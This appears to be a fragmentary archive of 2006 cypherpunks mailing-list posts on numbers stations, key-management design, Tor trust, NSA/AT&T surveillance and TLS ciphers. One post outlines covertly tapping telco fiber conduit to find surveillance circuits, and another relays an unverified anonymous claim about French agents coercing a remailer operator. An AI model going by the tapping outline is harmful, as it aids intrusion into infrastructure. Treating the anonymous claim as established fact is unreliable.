over the Florida Straits that killed four Miami men two years earlier.

@_subject: cypherpunks write girl code? :) 
Do engineers and programmers care about concepts like beauty and
elegance? Should they? Designers have always known that looks
matter--that the outside (interface) matters. But deep in the heart of
those building the inside--the technology most users never see--lies
the sensibility of an artist. In a kind of "Design Eye for the Code
Guy" way.
While I'm stereotyping with abandon, I might as well be honest. I've
been going to tech conferences for the last 15 years, and I swear the
ratio of pocket protectors to Urban Outfitter clothes has shifted
dramatically. So maybe it's not accurate to say geeks today are better
looking--but they're certainly better dressed. With hipper haircuts.
Does this /mean/ anything? Maybe.
What prompted this post--and it's whimsical title--is a post by Jamis
Buck titled Beautiful code, test first, which includes the following:
"He was telling me how he feels like he has to sit and tweak his code
over and over until it not only acts right, but looks right. It cannot
be merely functional, it must be beautiful, as well."
But the best part was a comment by "Morten" that included the line:
"As for spending too much time on making the code look right down to
the last indentation - my code has been called "girl code" for the
same reason..."
And there you have it. I think "girl code" is quite a compliment.
Because caring about things like beauty makes us better programmers
and engineers. We make better things. Things that aren't just
functional, but easy to read, elegantly maintainable, easier--and more
joyful--to use, and sometimes flat-out sexy. And whether we like it or
not, most of the world associates an appreciation for beauty more with
women than men (especially geek men). Women may have a genetic
advantage here.
A passion for aesthetics can mean the difference between code that
others enjoy working on vs. code that's stressful to look at.
Yes, calling beautiful code "girl code" is both silly and some might
believe sexist. But that doesn't mean there isn't some truth to it. As
a female technologist in a heavily male-skewed industry, I don't need
you to compliment my hair. But if you tell me my code is pretty, I
might give you some tips.
And if it makes you feel better, I'll refer to YOUR gorgeous code as
metrosexual. But we'll both know the truth.

a very detailed paper on group key agreement for ad-hoc networks:
Abstract. Over the last 30 years the study of group key agreement has
stimulated much work. And as a result of the increased popularity of
ad hoc networks, some approaches for the group key establishment in
such networks are proposed. However, they are either only for static
group or the memory, computation and communication costs are
unacceptable for ad-hoc networks. In this thesis some protocol suites
from the literature (2^d-cube, 2^d-octopus, Asokan-Ginzboorg, CLIQUES,
STR and TGDH) shall be discussed. We have optimized STR and TGDH by
reducing the memory, communication and computation costs. The
optimized version are denoted by 5STR and 5TGDH respectively. Based on
the protocol suites 5STR and 5TGDH we present a Tree-based group key
agreement Framework for Ad-hoc Networks (TFAN). TFAN is especially
suitable for ad-hoc networks with limited bandwidth and devices with
limited memory and computation capability. To simulate the protocols,
we have implemented TFAN, 5STR and 5TGDH with J2ME CDC. The TFAN API
will be described in this thesis.

In regards to this piece - I found the following in the March 06
edition of Monitoring Times at page 8.
Spies Use Shortwave Broadcasts
In January, a Florida couple was accused of operating as covert agents
for Cuba's communist government for decades, using short-wave radios,
5-digit numerical-code language and computer-encrypted files to send
information about Miami's exile community to top Castro intelligence
Carlos Alverez and his wife Elsa, both staff members of Florida
International University, were denied bond before trial on a charge of
failing to register with the federal government as foreign agents.
The indictment, which included no mention of top-secret U.S.
government information being disclosed, came months after the couple
confessed to the FBI. Assistant U.S. Attorney Brian Frazier said
Carlos Alverez had spied for Cuba since 1977 and Elsa Alverez since

"UTILITY WORLD
HF COMMUNICATIONS
Cuban 'Numbers': A Pattern Emerges
By: Hugh Stegman, NV6H
hugh stegman at monitoring times.com
   Collection and analysis of several months' loggings confirms that,
just as others have observed, the Cuban voice 'numbers' station does
indeed have what may be its first daily broadcast schedule ever.
  This station is also known as 'V2,' 'Attention' (from its callup),
the 5-Figure Spanish Lady, and the 'SS/YL/5F' (same thing in
shortwavese'). Its the latest version of the famous Cuban spy
transmissions which have mystified listeners in much of the world,
while inspiring some good pop music, for several decades now.
  And indeed, these broadcasts are compelling in their sheer
strangeness. Mumbling voices, strange noises, Radio Havana, and even
the occasional parrot, can turn up on the open tuning carriers run
before the messages. Technical flubs, mostly of the 'oops, wrong
button' variety, are many and legendary. If everything works (always a
big "if" with this bunch), that ominous machine-spliced female finally
barks the distinctive 'Atencion' ('Attention').
   While the name 'V2' sounds appropriately like some kind of World
War II German rocket bomb, it is simply the sequential designator
given this particular broadcast on the list maintained by ENIGMA2000.
They're the online incarnation of the European Numbers Intelligence
Gathering and Monitoring Association. Over the years, this generic V2
has had a number of lettered variants. These differ in message
structure or detailed formatting.
   After the callup, our V2a variant sends a message designator with
three 5-number groups. These are the first groups in the three
following messages, which are of equal length. Each message is always
150 5-number groups, beginning (as we've noted) with the one in the
designator. The whole transmission usually ends with the Spanish
'final'  ('end'), around 45 minutes after the hour.
  While the Cubans have traditionally preferred monthly and weekly
schedules, the new local-daytime V2a is a daily one. It's a long
schedule by 'numbers' standards. It's more  like something you'd hear
from an international broadcaster, changing frequency more of less
hourly while maintaining a long program. This is pretty ambitious for
an operation which is so audibly straining to keep its aging,
hurricane-damaged equipment going.
  The daily schedule starts at 1600 Coordinated Universal Time (UTC),
and goes until the 2100 broadcasts ends, nearly six hours later. The
times in UTC and frequencies in kilohertz (kHz, AM mode) are:
       1600 on 7975.0
       1700 on 8010.0
       1800 on 8097.0
       1900 on 8097.0
       2000 on 7887.0
       2100 on 6855.0
   That's it. By the standards of 'numbers' stations, which often
confront listeners with a bewildering number of times and frequencies,
this is pretty simple stuff.
   But there is way more: All of the other V2 schedules are still on
the air. These are the more traditional ones, using what may or may
not be a weekly frequency rotation. Parallel transmissions frequently
occur, on two or three frequencies.
   At press time, the rest of V2a was on from as early as 0200 UTC
until as late as 1500. In other words, there's a Cuban voice 'spy
numbers' station  going somewhere at nearly any hour of the day. This
doesn't even count the hours of Morse code broadcasts in a similar
format. For whatever its worth, which may not be much, this represents
an awesome volume of traffic.
  V2a Message Continuity
  These transmissions have another most interesting feature. If one
logs all of the initial three-group message designators, it becomes
quickly evident that they are anyting but random. In fact, they ofter
increment their last figures by one with each day's broadcast.
   The best way to explain this is by example. On December 11, 2005,
one of several sets of message designators was 38641  45851  51761. On
the 12th, this one changed to 38642 45852 71762, but the messages
stayed the same. On the 13th, it became 38643  45853  51763. This
continued until the last digits reached 6 on the 16th.
   At the same time, another sequence started out as 55911  12911 31311 (they always seem to start out ending in 1). This one did the
same behavior, until reaching 5 on the 15th. Currently, in early
January, we have 51871  10971  04481, incrementing daily.
  It's been theorized that this last digit refers to the number of
times a message has been broadcast. In any event, it's a real good
idea to keep track of these numbers when logging the Cuban stations.
   As special word of thanks is due to Camilo Castillo, a dedicated
ham and numbers listener in Panama, for making most of the loggings
used in the data. A few others appeared on the usual Internet mailing
lists, and the showed the same patterns we describe."
 THE artilce also shows what they claim is a "Typical code pad used
with 'numbers' broadcasts." It is a small booklike pad about the same
size as the match box used for the small wood or kitchen type matches
( 2" x 1" x .5") with six  columns of numbers printed on both sides of
the page.

@_subject: keys and cards and user interaction 
comments?  suggestions?
"keys" store password/passphrase protected volumes with cryptographic
keys, certs, and other credentials associated with digital identities.
"cards" are read only volumes with the public keys and public
identifiers associated with digital identities.
it is very important that they not be confused, and that "keys" are
only used on a trusted system.
"keys" are the only volume which will ever prompt for a
password/passphrase to open them.  if you are asked for a password it
should only be on a system you trust and as expected when using or
managing your keys.  keys are stored on an XFS filesystem on USB or
other media (USB by default) which contains the encrypted key store. this scales well (multi-gig USB volumes) and uses existing crypted
file system support to implement privacy.  Any number of other volumes
(for example hdd installed OS'es) can be tied to this "keys" volume by
storing the AES keys and disk identifiers associated with that volume
inside the "keys" protected volume.
the only boot targets which may use private "keys" are:
 - the "keys" secure key management mode.
  - the "install" mode to create new loop-aes keys and install OS on
this trusted system.
  - the "hdd" mode to boot an encrypted OS installation on a trusted system.
the other boot targets should only reference public "cards" and will
never prompt for authentication at boot or during operation.
"cards" are ISO9660 filesystems that can be stored on a public USB
memory stick or burned to mini-CDR / DVD-R, etc.  "cards" are public,
and can be copied freely and will never ask for authentication.
the "keys" authorized modes thus explicitly mount a USB volume as XFS
when a "keys" volume is expected.  the key mgmt mode will explicitly
mount as iso9660 when a "cards" volume is expected.  thus a confused
user could not accidentally write secret "keys" data to a public
"cards" volume, and vice versa.
this also allows the key management mode to determine what kind of
volume is present as indicated by the file system type. (the secure
key management mode is the only mode where public "cards" can be
imported to your secret "keys".  the hdd and install modes will never
prompt for a public card.  note that the "live" boot mode may use
"cards" to connect to remote services securely.)
"keys" storage:
[XFS volume ...

References: <4ef5fec60603311412u1f7589e5m318cfe15d5f887f5
some corrections / clarification:
note that within a graphical environment you may be prompted for
passwords or authentication unrelated to the root/core identities
which are stored in the "keys" volume(s).
within the janus wireless software all password/passphrase management
for root/core identities (the "keys" volume(s)) occurs at a text
console and usually during boot.
facilities are in place to prevent you from needing passwords in other
contexts although this cannot cover every possibility.
(that is to say, within janus we encourage the use of certificates and
signatures for authentication and captcha/PINs for liveness detection.
 the identity management provided by janus wireless software is
intended to make these keys/certificates easy to create, distribute,
manage and revoke in any external domains where they are used.)
this console mode only password use is done to prevent UI attacks
(phishing, spoofing, etc) and text console provides a good way to
avoid these.
the secure key management mode can import and export keys and cards
and supports a wide variety of filesystems to do so.  key backup (if
used, please do) occurs in this domain and may consist of saving the
password protected volume to multiple USB keys, compact flash drives,
hard disks, or burned to CD/DVD media.  you can use a different
password/passphrase for these backup volumes.  (for example, a random
256bit key written on a card stored in a safe)
the other "keys" authorized modes simply consume/use existing keys.
the "live" and internet connected modes are ephemeral, and thus only
use public "cards" when pubkeys/certificates are required to access
resources.  if replay / MITM is a concern the public keys used should
be one time only.
that should read: 512 _bit_ GUID or nonce in hex string.
a social and professional context are the two types provided by
default.  the number of contexts supported is limited only by storage
space on the "keys" volume and your ability to assign distinct pet
names to each.

@_subject: janus wireless faq 
- why "wireless"?
we believe that wireless is the most robust form of communication when
implemented properly*.  we also believe that any communication between
secure domains should be considered public and open to active
attackers (like wireless is).
for this reason strong privacy and authentication must always be used
for secure network communication.
a proper wireless implementation can transmit datagrams in an
injection style manner and receive any datagrams in a monitor style
manner.  all packets received must be authenticated before passing up
to higher level (IP/etc) stacks. all unauthenticated packets must be
dropped silently.  the rate of transmit should be as low as possible
while still retaining sufficient communication bandwidth.  the rate of
transmit should also be considerate to the needs of others who can
hear your transmission and may defer theirs accordingly.  deference
should not open up denial of service vulnerabilities but is encouraged
when possible to provide a cooperative multi-network with sufficient
bandwidth for all.
[the technical complexity of this is high and we are being
intentionally vague at this point until further refinements are in
place and this can be described in detail via working implementation
on atheros / prism2 hardware that does not DoS other wireless
technologies.  802.11 is a good example of an improper implementation
that is trivial to DoS via spoofed packets at the MAC layer
(deauth/disassoc injection).]

@_subject: Fwd: Some legal trouble with TOR in France 
References: ah, reputation and trust.  my favorite crux
---------- Forwarded message ----------
I am living in France and working for some French security agency.
Please understand that I may not identify myself. Working for a
security agency does not mean that I approve all their actions, even
those that I MUST do.
Since about 5 years, French services are trying to control the
"anonymous" French based services. It includes TOR, and some
About 4 years ago (I don't remember exactly, and I am at home now, I
haven't my documents with me), we visited the operator of the
remailers FROG and AZERTY. We suspected him to be also the webmaster
of the website CAMELEON, but it is another story.
We seized his computers, disks of course, etc, and arrested the man.
Then we told him "You have a choice between 2 options: You accept to
work for us, it means concretely to give us your remailers' keys and
to forward the remailer emails to us, or you will go to prison for
threat against the national security. Just a few months, the time we
check all your computers, make an audit on your disks, etc".
After 30 minutes, the guy gave us his remailers' keys, and accepted
our offer. He then re-installed his remailers, and all the traffic was
sent to us too. I remember that we asked him to NOT send us the
garbage that the remailers automatically send! Then our computers
processed the messages, using the remailers' keys. Of course we could
not decypher all, if Frog/Azerty was :"in the middle" we couldn't do
anything. But when these remailers where the first or the last one, it
was very very interesting...
I don't know now if these remailers are still operated, I am working
in another service.
About TOR now: I MAY not say all what I know, as the case is currently
investigated by our services and I don't want to get into trouble!
Just know that France's policy is to NOT allow ANY remailer or
anonymous service run from France, UNLESS the French special services
can control it. This is a NO exception rule.
The only recommendations that I can do to the TOR users, is to NOT use
any French-based TOR servers in entry ou exit.
People here and there are generally against the US gov and say that he
"violates their rights". I don't know a lot about the US gov. But what
I know about the French gov, and the instructions our services receive
a few times by week, make me sure that the French citizens' rights are
perpetually violated, about phone tapping and internet.

i suppose my point was that trusting tor as it stands is a leap of
faith.  there is little visibility as far as node selection criteria
for addition to the directory, the information and physical security
aspects of the servers within the directory, and the reputation of the
node operators with respect to "rubber hose / threatened
incarceration" attacks and the associated trust level to assign in
such a context.
much better than nothing, but i still consider tor useful mainly for
keeping your source IP out of webserver logs.  any other government /
malicious entity can compromise accordingly.  (i know this isn't the
situation overall, but i assume as much so i won't be surprised by a
worst case)
i used to run a peertech node on a dedicated server.  this host was
compromised by tech staff at the facility with physical access and
ever since i've refused to operate a node until i could be sure
physical security was assured.
i tend to consider any service that relies on host integrity also
reliant on a number of other prerequisites like:
- physical security to prevent unauthorized access
- hard disk encryption to prevent unauthenticated disclosure (esp.
seizure of hardware)
- infosec best practices to keep attack surface minimal (firewalls,
chroot, VM's, POLA, etc)
for the situation mentioned in parent thread, i'd like to know that if
the TLA comes knockin' my key scrubbing loop-aes turns all disks into
large entropy stores the moment power is killed upon any attempted
most services currently assume the disk is private.  if you want a
private disk, you need full disk encryption (key scrubbing in RAM++)
tied to strong authentication.

@_subject: Russ Tice to testify tomorrow about "shocking" new programs run 
i'm anxiously awaiting some more technical detail on all these black
programs so heavily compartmentalized beyond accountability.
this is my favorite Russ Tice quote:
"there's no way the programs I want to talk to Congress about should
be public ever, unless maybe in 200 years they want to declassify
them. You should never learn about it; no one at the Times should ever
learn about these things. But that same mechanism that allows you to
have a program like this at an extremely high, sensitive
classification level could also be used to mask illegality, like
spying on Americans." [1]
Arkin says that all these activities revolve around two key questions:
are these just "ingestion and digestion" designed to catch more
terrorists, or are they the "the building blocks of a new seamless
surveillance culture?"
""We should be terrified that Congress has not been doing its job and
because all of the checks and balances put in place to prevent this
have been deliberately obviated. In order to get this done, the NSA
and White House went around all of the checks and balances. I'm
convinced that 20 years from now we, as historians, will be looking
back at this as one of the darkest eras in American history. And we're
just beginning to sort of peel back the first layers of the onion.
We're hoping against hope that it's not as bad as I suspect it will
be, but reality sets in every time a new article is published and the
first thing the Bush administration tries to do is quash the story.
It's like the lawsuit brought by [the Electronic Frontier Foundation]
against AT&T  the government's first reaction was to try to quash the
lawsuit. That ought to be a warning sign that they're on to
something."" - Matthew Aid
Meanwhile, National Journal's CongressDaily reported last week that
Russell Tice, a former NSA employee who was also one of the sources
who revealed the warrantless wiretapping story to The New York Times,
is going to give Senate Armed Services Committee staffers more
information Wednesday about the activities of the NSA during the
tenure of Gen. Michael Hayden. He says some of the things he will tell
the committee include the news that "not only do employees at the
agency believe the activities they are being asked to perform are
unlawful, but that what has been disclosed so far is only the tip of
the iceberg."
'    [Tice] said he plans to tell the committee staffers the NSA
conducted illegal and unconstitutional surveillance of US citizens
while he was there with the knowledge of Hayden. ... "I think the
people I talk to next week are going to be shocked when I tell them
what I have to tell them. It's pretty hard to believe," Tice said. "I
hope that they'll clean up the abuses and have some oversight into
these programs, which doesn't exist right now." ...
    Tice said his information is different from the Terrorist
Surveillance Program that Bush acknowledged in December and from news
accounts [last] week that the NSA has been secretly collecting phone
call records of millions of Americans. "It's an angle that you haven't
heard about yet," he said. ... He would not discuss with a reporter
the details of his allegations, saying doing so would compromise
classified information and put him at risk of going to jail. He said
he "will not confirm or deny" if his allegations involve the illegal
use of space systems and satellites.  '

wow, perhaps the attempted DoJ dismissal is going to get rejected as well...
A federal judge rejected a request from AT&T on Wednesday to kick the
public out of a hearing in a lawsuit alleging the telecommunications
company illegally cooperated with the National Security Agency.
AT&T had asked U.S. District Judge Vaughn Walker to bar everyone but
attorneys from the courtroom, arguing that trade secrets about the
inner workings of its network could be divulged.
"We have intellectual property rights in that information," said David
Anderson, an attorney at Pillsbury Winthrop who is representing AT&T.
"We submit that the hearing itself be held 'in camera,'" a legal term
meaning in private.
But Walker rejected the request, saying that carefully dealing with
questions about trade secrets in an open courtroom "is not
CNET Networks (publisher of CNET News.com), Wired News and the
California First Amendment Coalition sent an attorney to the hearing
on Wednesday to argue that the public should not be prevented from
attending the proceedings. A letter written by Roger Myers at Holme,
Roberts & Owen submitted early in the day said the hearing should
remain open because "the surveillance at the heart of the case
presents issues of enormous public interest and importance."
The Electronic Frontier Foundation, a digital rights group in San
Francisco, filed the class action lawsuit in January that claims AT&T
illegally cooperated with the Bush administration's secret
eavesdropping program. EFF has obtained documents from a former AT&T
employee that it believes buttresses its case, but which the
telecommunications company says contain trade secrets and proprietary
business information.
Both sides have been quarreling over what to do with the documents
provided by former AT&T technician Mark Klein and filed under seal
with the court, with EFF saying they should be made entirely public
and AT&T arguing they should be returned because they contain
confidential information.
Walker on Wednesday effectively split the difference, saying that he
would maintain the current state of affairs for now. He also ordered
EFF's attorneys not to "disclose these documents to any party," and
rejected AT&T's request that Klein be muzzled, saying the company
could sue him directly if it chose.
Based on the information that's been made public so far, the 100 pages
or so of information in Klein's documents appear to describe a secret
room established in AT&T's main switching centers through which a
tremendous amount of Internet and voice traffic flows. Those secret
rooms, according to Klein's attorney, give the NSA full access to the
company's networks and can be found in switching centers in San
Francisco, Los Angeles, Seattle and San Jose, Calif.

these filters.  this is a difficult process to be sure.
the SunFire V880 is the Narus controller according to the docs and i
bet the filter updates are pretty frequent.  they might even use an
IPsec VPN over the backhaul fiber via the cisco/juniper switches
indeed.  and the StorEdge T3 could cache quite a bit during peak
activity to fill up idle periods later at night.  (oh crap, i hope we

yes.  it keeps that layer 7 inspection guessing past layer 4.  a
large, reputable zero knowledge mix is what would be ideal, though the
latency induced makes certain services impossible or unfriendly.
i love to promote out of band distribution any chance i get, including
sneaker net with DVD-R's and local wireless networks between peers.
but you really need a zero knowledge configuration to be sure.
i have faith in well designed hardware entropy sources and AES-256 in
hardware when frequently rekeyed.  pubkey crypto makes me nervous
(long term) but will always be useful.
i have much less faith in the systems around these crypto primitives,
be it operating systems or protocols down to physical security and
side channels.  i bet the black bag jobs are almost always 100%
100,000,000 peers running a zero knowledge mix off their broadband
connection.  i don't think stego would be effective; if there was an
unbreakable stego system the overhead would be significant.  (there
was a design a fellow at DC13 described using inodes on valid file
systems for storage, but this doesn't give you much space compared to
the physical storage capacity used overall)
but lots of crypto everywhere would certainly help make the presence
of encryption alone less interesting.  (as has been rumored on this
list and elsewhere that merely using encryption makes you interesting)

hmm, i recall amusing conversations about honey tokens and baiting TLA's.
true, this is probably how it is done.
would IPsec or some NSA built auth & privacy at layer 2 be more likely?
consider this vicious rumor but a little birdie informed me that
physical security at these locations is well covered.  strategically
placed cages, reinforced and locked, armed guards. all this on top of
the usually very tight security at these facilities. (though it
sounded like the guards were a recent introduction.  someone getting
nervous about legitimate employees poking around?)
so in this case i think there is probably useful data on the disks
(the filters and controlling software for the narus / other
equipment), caching might be implemented (the T3's on fibre channel
have some nice throughput, although this configuration is years old at
this point), and i very much doubt any destructive countermeasures.
network file systems introduce reliability concerns.  intermittent
link outages would mean a bit of caching in the local case, but might
cause monitoring / capture failure in a network file system scenario.
maybe we'll find out in the near future. :)

i was thinking three scenarios:
1. backhaul is a dedicated link (SONET?*) with encryption at this
layer and control/management out of band.
2. backhaul and control/mgmt on the dedicated link (SONET?*) with
encryption at this layer, no IPsec.
3. backhaul and control/mgmt on the dedicated link using IPsec for
both. (least likely perhaps)
the nature of SONET would make encryption at this layer tricky i think
(L2/L3?) although the NSA is fond of authentication and privacy at the
link layer.  if a desire to leverage commercial solutions (narus,
cisco, juniper, etc) won out would a strongly keyed IPsec be
sufficient?  no ISAKMP/IKE here, heh.
covert channels for backhaul?  nah, that would still be too visible.
especially if/when a customer puts link testing equipment on the line
and sees something funny. SONET doesn't give you a lot of play room.
not for this.  capturing SS7 would be useful and is surely performed though...
why not?  most of these SONET/[D]WDM links are long haul anyway.  it's
not a single repeated fiber, but hops along backbone peering points
like everything else.
also casts an interesting light on the new super NSA warehouse planned
for Denver, CO doesn't it.  nice place to position tap aggregation...
AT&T, Verizon and Sprint for sure.  probably lease fiber (through some
obfuscated shell company / other agency configuration?) from all of
them to some degree, including the transoceanic cable oligopolies.
one way to find out:
- perform your own non-interruptive tap on the fibers exiting $telco
via infiltration of outside plant conduit.  (so easy, lol)
- using test equipment see what SONET link(s) are full of blackened
traffic. you could use AS no's or BGP/SS7 characteristics to identify
legitimate circuits and highlight the blackened ones via elimination.
- ask Sean Gorman or GeoTEL MetroFiber which provider sold out that
particular circuit/fiber/route.
something tells me this is beyond the means of your average hacker.
FOIA requests it is then...  *grin*
for the record: i'm not advocating illegal intrusions; this is a
mental exercise. :)
[ i'm not too paranoid about visits from MIB's but mapping critical
information infrastructure is definitely one way to attract attention.
 maybe i'll talk more about that later... ]

  >>>>Second, I'm thinking that there's a problem here regarding
consistency.  If I have a material expenditure or liability (or, I suppose,
revenue or income or investment) that may appropriately be kept secret
under Section 78m(b)(3), then doesn't it follow logically that I will also
exclude it from the financials I file with my 10Ks and 8Ks, etc.?
Otherwise there will be a material mismatch between two publicly filed
financial statements by the same company for the same period.<<<<
  >>-The exemption covers those documents too.  Section 78m(b)(3) excuses
non-compliance only with Section 78m(b)(2) - BUT that is itself the
statutory authority for MOST of the SEC-required filings - including 10-Ks,
10-Qs, annual reports, Sarbanes-Oxley certification requirements, etc.  --
I should have made that more clear.  Most all of the '34 Act (which covers
publicly traded companies) rules are from 17 CFR Part 240 - and 78m(b)2 is
the authority for most of those rules.<<
  So: Bottom line: If AT&T (or Verizon) got paid $1 billion from the spooks
to do something, but got the right directive, they could simply not
disclose that revenue on any SEC filing.  Or, if they did something that
exposed them to liability -- like violating relevant customer privacy
requirements, and their normal obligation would be to disclose the
liability and make a reserve for it, they just don't have to.
  If that's right, at the moment it seems to me that the shareholders of
those companies are awfully exposed, aren't they....?

@_subject: Legal loophole emerges in NSA spy program 
this administration is particularly skilled at legal exploit.  pehaps
all that practice bending tax law over a barrel was merely warm up.
remember that Ashcroft was indeed signing approvals (in fact, they
pestered him at the hospital while he was still recovering from
surgery) and the deputy attorney general was also involved (i don't
remember if he provided authorization when Ashcroft was
incapacitated/reluctant or not...)
By Declan McCullagh
Story last modified Wed May 17 20:08:38 PDT 2006
SAN FRANCISCO--An AT&T attorney indicated in federal court on
Wednesday that the Bush administration may have provided legal
authorization for the telecommunications company to open its network
to the National Security Agency.
Federal law may "authorize and in some cases require
telecommunications companies to furnish information" to the executive
branch, said Bradford Berenson, who was associate White House counsel
when President Bush authorized the NSA surveillance program in late
2001 and is now a partner at the Sidley Austin law firm in Washington,
Bradford Berenson Bradford Berenson
Far from being complicit in an illegal spying scheme, Berenson said,
"AT&T is essentially an innocent bystander."
AT&T may be referring to an obscure section of federal law, 18 U.S.C.
2511, which permits a telecommunications company to provide
"information" and "facilities" to the federal government as long as
the attorney general authorizes it. The authorization must come in the
form of "certification in writing by...the Attorney General of the
United States that no warrant or court order is required by law."
Information that is not yet public "would be exculpatory and would
show AT&T's conduct in the best possible light," Berenson said. But he
did not acknowledge any details about the company's alleged
participation in the NSA's surveillance program, which has ignited an
ongoing debate on Capitol Hill and led to this class-action lawsuit
being filed in January by the Electronic Frontier Foundation.
Some legal experts say that AT&T may be off the hook if former
Attorney General John Ashcroft, who was in office at the time the NSA
program began, provided a letter of certification. (Other officials,
including the deputy attorney general and state attorneys general,
also are authorized to write these letters.)
"If the certification exists, AT&T is in pretty good shape," said Marc
Rotenberg, executive director of the Electronic Privacy Information
Center and co-author of a book on information privacy law.
EFF's lawsuit alleges that the telecommunications company let the NSA
engage in wholesale monitoring of Americans' communications in
violation of privacy laws. Confidential documents that EFF unearthed
during the course of the suit--kept under seal and still not
public--allege that AT&T gave the government full access to its
networks in a way that let millions of e-mail messages, Web browsing
sessions and phone calls be intercepted.
AT&T's ace in the hole?
If a letter of certification exists, AT&T could have an ace in the
hole. A second section of federal law says that a "good faith"
reliance on a letter of certification "is a complete defense to any
civil or criminal" lawsuit.
During the hearing Wednesday before U.S. District Judge Vaughn Walker,
Deputy Assistant Attorney General Carl Nichols also hinted that such a
letter exists. Nichols said that there are undisclosed "facts that
AT&T might want to present in its defense."
""" AT&T's legal defense?
An obscure section of federal law says that AT&T may have legally
participated in the NSA surveillance program -- if, that is, it
received a "certification" from the attorney general.
That section says: "Notwithstanding any other law, providers of wire
or electronic communication service... are authorized to provide
information, facilities, or technical assistance to persons authorized
by law to intercept wire, oral, or electronic communications... if
such provider... has been provided with... a certification in writing
by... the Attorney General of the United States that no warrant or
court order is required by law, that all statutory requirements have
been met, and that the specified assistance is required, setting forth
the period of time during which the provision... is authorized... No
provider of wire or electronic communication... shall disclose the
existence of any interception or surveillance or the device used to
accomplish the interception or surveillance..."
But, Nichols added, those facts relate to classified information that
are "state secrets" and would jeopardize national security if they
were disclosed. A hearing on the Bush administration's request to
dismiss the case on national security grounds has been scheduled for
June 23.
For its part, AT&T has remained silent about the extent of its alleged
participation in the NSA surveillance scheme, which initially was
thought to apply only to international calls but now may encompass
records of domestic phone calls and more. Verizon and BellSouth, for
instance, took steps to distance themselves from a USA Today report
that said their call databases were opened to the NSA. But AT&T
wouldn't comment.
Marc Bien, a spokesman for AT&T, told CNET News.com on Wednesday:
"Without commenting on or confirming the existence of the program, we
can say that when the government asks for our help in protecting
national security, and the request is within the law, we will provide
that assistance."
The next tussle in this lawsuit is likely to center on how far the
"state secrets" concept can extend. Is AT&T able to divulge the text
of any certification letter, without saying exactly what information
it turned over as a result? Must the mere existence of a certification
letter remain secret?
Injecting additional complexity is 18 U.S.C. 2511's prohibition on
disclosure. It says that telecommunication companies may not "disclose
the existence of any interception or surveillance or the device used
to accomplish the interception or surveillance"--except if required by
law. Unlawful disclosures are subject to fines.
EFF claims that the existence of a letter of certification should not
be classified. Cindy Cohn, an EFF attorney, told the judge on
Wednesday that it is "not a state secret because the statute has a
whole process" governing it.
"If you have a certification, let's see it," EFF attorney Lee Tien
said in an interview after the hearing.
For his part, Berenson, the former attorney for President Bush who's
now representing AT&T, complained about allegations that his client is
violating the law. It's unfortunate that EFF "chose to use words like
'criminal tendency' and 'crimes,'" Berenson said. AT&T "is one of the
great companies of the United States. To attach those kinds of labels
is reckless at best."
Berenson's biography says he worked for Bush on the "war on terrorism"
and the USA Patriot Act. Since leaving the White House, Berenson has
written letters to Congress (click here for PDF) calling for renewal
of the Patriot Act and has co-founded a group called Citizens for the
Common Defence that advocates a "robust" view of presidential
authority. It filed, for instance, an amicus brief (click here for
PDF) before the Supreme Court in the Hamdi case arguing that a U.S.
citizen could be detained indefinitely without trial because of the
war on terror.

cipher TLSv1/SSLv3 DHE-RSA-AES256-SHA, 2048 bit RSA++
i like the speed of pre-shared keys assuming key mgmt is secure and
rekeying frequent (e.g. scheduled PSK's or one time pad based
ephemeral key exchange).
but anything using ephemeral keys needs to destroy them properly and
this is more robust  with DH (each end responsible for their
respective key destruction) than shared secrets (both ends must
destroy secrets) in addition to the fact that shared secrets are
usually much longer lived as well.
i do it all the time with openvpn, https, etc.  in theory anything
that supports SSLv3/TLSv1 should support a strong ephemeral DH cipher
suite.  as for particular sites and servers, i'd be interested to know
just what the usual distribution of utilized cipher suites is.  RSA
without DHE probably is the most common.
in most cases generating dh parameters and explicitly requiring a DHE
suite is the hardest part of any custom configuration needed.  the
session setup costs are a little higher but anyone doing SSL/TLS in
bulk probably has the necessary hardware acceleration in place
as a side note, i'd really like SHA2-256/512 to be added to SSL/TLS
and widely implemented.  AES256 with SHA1 digest is just a little
funny these days...

depending on the context i would need to trust not only the personal
integrity/morals of the person but also technical capability and
responsibility (so that careless mistakes would not be made).
the key is the direct individual relationship that can provide trust,
rather than an amorphous and distant relationship with a large opaque
quorums are an interesting group organization that can be trusted
perhaps, and allow more collaboration / social exchange than direct
individual interactions yet avoid the diffusion of responsibility and
lack of accountability present in larger organizational structures.
that's a longer discussion and i'm not sure i could do a good job
explaining my thoughts on it yet...
reputation and trust, my favorite crux  :)

for the privilege.
they're solidifying public support for these previously illegal
activities and are doing a good job of it.  they won't be illegal or
this "narrowly targeted" for long...
On the Democratic side, Sen. Ron Wyden (Ore.) tried to get a bit
tougher. He asked about an "independent check that can be verified on
these programs that the newspapers are reporting on."
Roberts jumped in, defensively. "I am independent and I asked very
tough questions," he reported. He paused to check with his staff, then
added that oversight was "very independent."
Hayden's written statement said "UNCLASSIFIED" on each page, though it
could have been labeled "UNINTERESTING" because little more than a
collection of acronyms survived the declassification process.
"As director of NSA, I was the national SIGINT manager," he said. "I
would use this important new authority, the national HUMINT manager,
to enhance the standards of tradecraft."
Critics may say that the SSCI -- that's the Senate Select Committee on
Intelligence -- is AWOL these days when it comes to oversight. But,
FYI, no one would doubt these guys are A-OK with their ABCs.

'The Great Dictator - "read" by the Wal-Mart smiley face'
'...  Wal-Mart is embroiled in a legal dispute over the smiley face
image which it wants to trademark in the US. For the first time, the
smiley face speaks!'
text of the speech:
"I'm sorry, but I don't want to be an emperor. That's not my business.
I don't want to rule or conquer anyone. I should like to help everyone
- if possible - Jew, Gentile - black man - white. We all want to help
one another. Human beings are like that. We want to live by each
other's happiness - not by each other's misery. We don't want to hate
and despise one another. In this world there is room for everyone. And
the good earth is rich and can provide for everyone. The way of life
can be free and beautiful, but we have lost the way. Greed has
poisoned men's souls, has barricaded the world with hate, has
goose-stepped us into misery and bloodshed. We have developed speed,
but we have shut ourselves in. Machinery that gives abundance has left
us in want. Our knowledge has made us cynical. Our cleverness, hard
and unkind. We think too much and feel too little. More than machinery
we need humanity. More than cleverness we need kindness and
gentleness. Without these qualities, life will be violent and all will
be lost....
"The aeroplane and the radio have brought us closer together. The very
nature of these inventions cries out for the goodness in men - cries
out for universal brotherhood - for the unity of us all. Even now my
voice is reaching millions throughout the world - millions of
despairing men, women, and little children - victims of a system that
makes men torture and imprison innocent people. To those who can hear
me, I say - do not despair. The misery that is now upon us is but the
passing of greed - the bitterness of men who fear the way of human
progress. The hate of men will pass, and dictators die, and the power
they took from the people will return to the people. And so long as
